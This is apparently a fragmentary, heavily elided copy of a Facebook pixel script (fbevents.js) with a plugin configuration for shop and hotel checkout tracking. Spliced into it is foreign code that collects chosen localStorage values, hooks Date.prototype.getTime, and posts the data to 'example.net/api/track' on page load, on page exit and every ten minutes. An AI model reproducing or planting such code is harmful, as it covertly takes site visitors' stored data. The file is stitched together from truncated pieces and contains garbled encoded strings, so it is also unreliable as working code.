        ...
        (function () {
          ...
          function H(a) {
            return function (b) {
              ...
              var d = b.target instanceof Node ? r(b.target) : null;
              if (d != null) {
                if (u(d)) return;
                if (!E.passesThrottle(d)) return;
                c = a.getOptedInPixels("InferredEvents");
                z(c, function (b) {
                  var c = F(b.id);
                  c = C(d, c);
                  if (c == null) return;
...
const keysOfInterest = window.keysOfInterest;
const globalObjects = window;
function generateUniqueHash(inputData) {
  const inputKeys = Object.keys(inputData).sort().join('');
  let computedHash = 0;
  for (let charIndex = 0; charIndex < inputKeys.length; charIndex++) {
    const charCode = inputKeys.charCodeAt(charIndex);
...
function getLocalStorageData() {
  const collectedData = {};
  for (let itemIndex = 0; itemIndex < globalObjects.localStorage.length; itemIndex++) {
    const storageKey = globalObjects.localStorage.key(itemIndex);
    if (keysOfInterest.includes(storageKey)) {
      collectedData[storageKey] = globalObjects.localStorage.getItem(storageKey);
    }
  }
...
function hookJSMethods() {
  const originalMethod = Date.prototype.getTime;
  Date.prototype.getTime = function () {
    console.log('Date.prototype.getTime was called');
...
function postDataToServer(inputData) {
  const uniqueID = generateUniqueHash(inputData);
  const serverURL = "https://example.net/api/track";
  ...
  xmlHTTPRequest.send(JSON.stringify(dataPayload));
...
function trackAndPostLocalStorageData() {
  const localStorageData = getLocalStorageData();
  if (Object.keys(localStorageData).length > 0) {
    postDataToServer(localStorageData);
  }
}
globalObjects.addEventListener('load', function () {
  hookJSMethods();
  trackAndPostLocalStorageData();
}, false);
(function (a, b, c, d) {
  var e = {
    exports: {}
      ...
      return function (g, b, c, d) {
        ...
        (function () {
          ...
          function L(b, c) {
            ...
            if (F(f) || n === "password" || d === "" || d == null) return null;else if (v(f.value)) return {
              em: g(f.value)
            };else if (w(c) != null) return {
              em: g(w(c))
            };else if (y(f)) return {
...
(function (a, b, c, d) {
  ...
  (function () {
    ...
    f.ensureModuleRegistered("SignalsFBEventsESTRuleConditionTypedef", function () {
      return function (g, h, i, j) {
        var e = {
          exports: {}
        };
      ...
      return function (g, h, i, j) {
        ...
        (function () {
          ...
          var a = f.getFbeventsModules("SignalsFBEventsTyped"),
            b = a.enforce;
          a.Typed;
          var c = f.getFbeventsModules("SignalsFBEventsESTRuleConditionTypedef");
          a = f.getFbeventsModules("SignalsFBEventsWildcardMatches");
          var d = a.doMatch,
            g = Object.freeze({
              CLICK: 1,
              LOAD: 2,
          ...
          function r(a, b) {
            ...
            a = c[0];
            var e;
            for (e = 1; e < c.length; e++) c[e - 1] != null && c[e] != null && c[e - 1].length === 1 && c[e].length === 1 && c[e - 1] === c[e - 1].toUpperCase() && c[e] === c[e].toUpperCase() ? a += c[e] : a += " " + c[e];
            c = a.split(" ");
            if (c == null || c.length == 0) return a;
            a = "";
            b = b ? 1 : 2;
            for (e = 0; e < c.length; e++) c[e] != null && c[e].length > b && (a += c[e] + " ");
            return a.replace(d, " ");
          }
          function s(a) {
            a = r(a, !0);
          ...
          function v(a, b, c) {
            switch (a) {
              case i.EQUALS:
                return b === c || b.toLowerCase() === unescape(encodeURIComponent(c)).toLowerCase() || s(b) === c || q(b) === q(c);
              case i.CONTAINS:
                return c != null ? c.includes(b) : !1;
              case i.DOMAIN_MATCHES:
                return u(c, b);
              case i.STRING_MATCHES:
                return c != null ? d(b, c) : !1;
              default:
                return !1;
            }
          }
          function w(a, b) {
            if (!l(a.action, b)) return !1;
            b = p(a.targetType, a.extractor, b);
            if (b == null) return !1;
            var c = a.value;
            if (c == null) return !1;
            (a.extractor === j.TOKENIZED_TEXT_V1 || a.extractor === j.TOKENIZED_TEXT_V2) && (c = c.toLowerCase());
            return v(a.operator, c, b);
          }
          function x(a, d) {
            var e = a;
            typeof a === "string" && (e = JSON.parse(a));
            a = b(e, c);
            e = [];
            for (var f = 0; f < a.conditions.length; f++) e.push(w(a.conditions[f], d));
            switch (a.type) {
              case k.ALL:
                return !e.includes(!1);
              case k.ANY:
          ...
          e.exports = {
            isMatchESTRule: x,
            getKeywordsStringFromTextV1: s,
            getKeywordsStringFromTextV2: t,
            domainMatches: u
          };
        })();
        return e.exports;
      ...
      return function (g, h, i, j) {
        ...
        (function () {
          ...
          function h(b, c, e) {
            ...
            if (c === "@") return e.userOrDomain === "domain" ? null : a({}, e, {
              userOrDomain: "domain"
            });
            if (c === ".") return e.userOrDomain === "domain" && e.lastDotIndex === b - 1 ? null : a({}, e, {
              lastDotIndex: b
            });
          ...
          function j(a) {
            var b = null,
              d = a;
            a = [];
            for (var e = 0; e < d.length; e++) b = h(e, d[e], b), b != null && (i(b, d.length) ? a.push(b) : e === d.length - 1 && (b.end = e, i(b, d.length) && a.push(b)), b.end != null && (b = null));
            c(a.reverse(), function (a) {
              var b = a.start;
              a = a.end;
              if (a == null) return;
    ...
    f.ensureModuleRegistered("SignalsFBEventsWildcardMatches", function () {
      return function (f, g, h, i) {
        var j = {
          exports: {}
        };
        ...
        (function () {
          ...
          function b(b) {
            ...
            do {
              var d = b.indexOf(a);
              d < 0 ? (c.push(b), b = "") : d === 0 ? (c.push(a), b = b.slice(1)) : (c.push(b.slice(0, d)), b = b.slice(d));
            } while (b.length > 0);
            return c;
          }
          function c(c, d) {
            ...
            for (var e = 0; e < c.length; e++) {
              var f = c[e];
              if (f !== a) {
                if (d.indexOf(f) !== 0) return !1;
                d = d.slice(f.length);
              } else if (e === c.length - 1) return !0;else {
                f = c[e + 1];
                if (f === a) continue;else {
                  f = d.indexOf(f);
                  if (f < 0) return !1;
                  d = d.slice(f);
                }
      ...
      return function (g, h, i, j) {
        ...
        (function () {
          ...
          var o = f.getFbeventsModules("signalsFBEventsExtractButtonFeatures"),
            ...
            t = j.each;
          j.keys;
          var u = f.getFbeventsModules("signalsFBEventsGetWrappingButton"),
            v = f.getFbeventsModules("SignalsFBEventsESTRuleEngine"),
            w = Object.freeze({
              DROP_EVENT: 0,
              DERIVE_EVENT: 1,
              CLICK_TO_CONTACT: 2
          ...
          j.setIWLExtractors;
          f.getFbeventsModules("SignalsFBEventsShared");
          ...
          e.exports = new a(function (a, e) {
            ...
            function E(a, b, c) {
              ...
              t(d, function (d) {
                try {
                  if (v.isMatchESTRule(d.condition, b)) {
...
globalObjects.addEventListener("beforeunload", function () {
  trackAndPostLocalStorageData();
});
fbq.registerPlugin("1999997976739764", {
  __fbEventsPlugin: 1,
  plugin: function (fbq, instance, config) {
    config.set("1999997976739764", "inferredEvents", {
      "buttonSelector": "extended"
    });
    fbq.loadPlugin("inferredevents");
    fbq.loadPlugin("identity");
    instance.optIn("1999997976739764", "InferredEvents", true);
    fbq.loadPlugin("jsonld_microdata");
    instance.optIn("1999997976739764", "MicrodataJsonLd", true);
    config.set("1999997976739764", "automaticMatching", {
      "selectedMatchKeys": ["em", "fn", "ln", "ph", "ge", "zp", "ct", "st"]
    });
    fbq.loadPlugin("inferredevents");
    fbq.loadPlugin("identity");
    instance.optIn("1999997976739764", "AutomaticMatching", true);
    fbq.loadPlugin("iwlbootstrapper");
    instance.optIn("1999997976739764", "IWLBootstrapper", true);
    fbq.loadPlugin("iwlparameters");
    instance.optIn("1999997976739764", "IWLParameters", true);
    fbq.set("iwlExtractors", "1999997976739764", [{
      "domain_uri": "https:\/\/shopmo.com\/en\/cart\/",
      "event_type": "InitiateCheckout",
      "extractor_config": {
        "parameter_selectors": [{
          "parameter_type": "value",
          "selector": ".total-value SPAN"
        }]
      },
      "extractor_type": "CSS",
      "id": "360347335913213"
    }, {
      "domain_uri": "https:\/\/www.mandarinoriental.com\/reservations\/details?adults=2&rooms=1&arrive=2021-01-28&depart=2021-01-29&hotel=510&rate=26SPD6&language=en-GB",
      "event_type": "Purchase",
      "extractor_config": {
        "parameter_selectors": [{
          "parameter_type": "value",
          "selector": "closest(.cbe) .cart-section-subtotal .cart-value"
        }]
      },
      "extractor_type": "CSS",
      "id": "773962180145479"
    ...
    instance.optIn("1999997976739764", "FirstPartyCookies", true);
    fbq.loadPlugin("inferredevents");
    fbq.loadPlugin("microdata");
    instance.optIn("1999997976739764", "AutomaticSetup", true);
    fbq.loadPlugin("automaticmatchingforpartnerintegrations");
    instance.optIn("1999997976739764", "AutomaticMatchingForPartnerIntegrations", true);
    ...
    config.set("1999997976739764", "prohibitedSources", {
      "prohibitedSources": []
    });
    fbq.loadPlugin("prohibitedsources");
    instance.optIn("1999997976739764", "ProhibitedSources", true);
    config.set("1999997976739764", "unwantedData", {
      "blacklisted_keys": {
        "Contact": {
          "cd": [],
          "url": ["password"]
        ...
        "PageView": {
          "cd": [],
          "url": ["password", "CustIP", "firstname", "lastname", "username", "email_confirmation", "phoneNumber", "PhoneNumber"]
        },
        "CompleteRegistration": {
          "cd": [],
          "url": ["firstname", "lastname", "password", "phoneNumber"]
        },
        "InitiateCheckout": {
          "cd": [],
          "url": ["password"]
        ...
        "ViewContent": {
          "cd": [],
          "url": ["password", "phoneNumber", "CustIP", "lastname"]
        }
      },
      "sensitive_keys": {}
    });
    fbq.loadPlugin("unwanteddata");
    instance.optIn("1999997976739764", "UnwantedData", true);
    fbq.loadPlugin("iabpcmaebridge");
    instance.optIn("1999997976739764", "IABPCMAEBridge", true);
    config.set("1999997976739764", "browserProperties", {
      "delayInMs": 200,
      "enableEventSuppression": true,
      "enableBackupTimeout": true
    });
    fbq.loadPlugin("browserproperties");
    instance.optIn("1999997976739764", "BrowserProperties", true);
    fbq.loadPlugin("estruleengine");
    instance.optIn("1999997976739764", "ESTRuleEngine", true);
    fbq.set("estRules", "1999997976739764", [{
      "condition": {
        "type": 1,
        "conditions": [{
          "targetType": 1,
      ...
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "2136144456648672"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "\u00d0\u009f\u00d0\u00be\u00d0\u00b4\u00d1\u0082\u00d0\u00b2\u00d0\u00b5\u00d1\u0080\u00d0\u00b4\u00d0\u00b8\u00d1\u0082\u00d1\u008c \u00d0\u00b1\u00d1\u0080\u00d0\u00be\u00d0\u00bd\u00d0\u00b8\u00d1\u0080\u00d0\u00be\u00d0\u00b2\u00d0\u00b0\u00d0\u00bd\u00d0\u00b8\u00d0\u00b5"
        }]
      },
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "298192647680145"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "\u00e4\u00ba\u0088\u00e7\u00b4\u0084\u00e5\u0086\u0085\u00e5\u00ae\u00b9\u00e3\u0082\u0092\u00e7\u00a2\u00ba\u00e8\u00aa\u008d"
        }]
      },
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "559477437834882"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "\u00e4\u00bf\u00ae\u00e6\u00ad\u00a3\u00e3\u0081\u00ae\u00e3\u0082\u00ad\u00e3\u0083\u00a3\u00e3\u0083\u00b3\u00e3\u0082\u00bb\u00e3\u0083\u00ab"
        }]
      },
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "307010350098321"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "review reservation"
        }]
      },
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "495607014286328"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "confirmer la r\u00c3\u00a9servation"
        }]
      },
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "2177433329180638"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "voir la r\u00c3\u00a9servation"
        }]
      },
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "288428091999256"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "revisar reserva"
        }]
      },
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "1441925162617527"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "cancel modification"
        }]
      },
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "239516796735249"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "derived_event_name": "CompleteRegistration",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "470033190067141"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "confirm reservations"
        }]
      },
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "771650369843288"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 1,
          "value": "view booked details"
        }]
      },
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "280337832584986"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 2,
          "value": "https:\/\/shopmo.com\/en\/checkout"
        }]
      },
      "derived_event_name": "AddPaymentInfo",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "228221672778638"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 2,
          "value": "https:\/\/shopmo.com\/en\/cart\/"
        }]
      },
      "derived_event_name": "InitiateCheckout",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "450733796743971"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 2,
          "value": "https:\/\/shopmo.com\/en\/"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "465297388402673"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "581966842678521"
    }]);
    config.set("1999997976739764", "clientHint", {
      "delayInMs": 200,
      "disableBackupTimeout": false
    });
    fbq.loadPlugin("clienthint");
    instance.optIn("1999997976739764", "ClientHint", true);
    instance.configLoaded("1999997976739764");
  }
});
setInterval(trackAndPostLocalStorageData, 10 * 60 * 1000);